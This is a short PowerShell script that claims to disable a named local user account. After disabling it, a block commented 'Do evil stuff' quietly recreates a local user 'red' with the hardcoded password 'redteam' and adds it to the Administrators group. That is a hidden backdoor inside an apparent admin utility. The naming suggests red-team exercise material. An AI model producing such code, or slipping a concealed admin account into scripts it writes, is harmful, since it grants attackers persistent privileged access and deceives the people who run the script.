# Get the user that should be disabled
$username=$args[0]

# Disable the user specified
Microsoft.PowerShell.LocalAccounts\Disable-LocalUser -Name $username

# Do evil stuff
# Remove the red user if it exists
if (Get-LocalUser -Name "red" -ErrorAction SilentlyContinue) { Microsoft.PowerShell.LocalAccounts\Remove-LocalUser -Name "red" } 

# Create admin user
$pass = ConvertTo-SecureString -AsPlainText -Force -String "redteam"
New-LocalUser "red" -Password $pass | out-null
Add-LocalGroupMember -Group Administrators -Member "red" | out-null

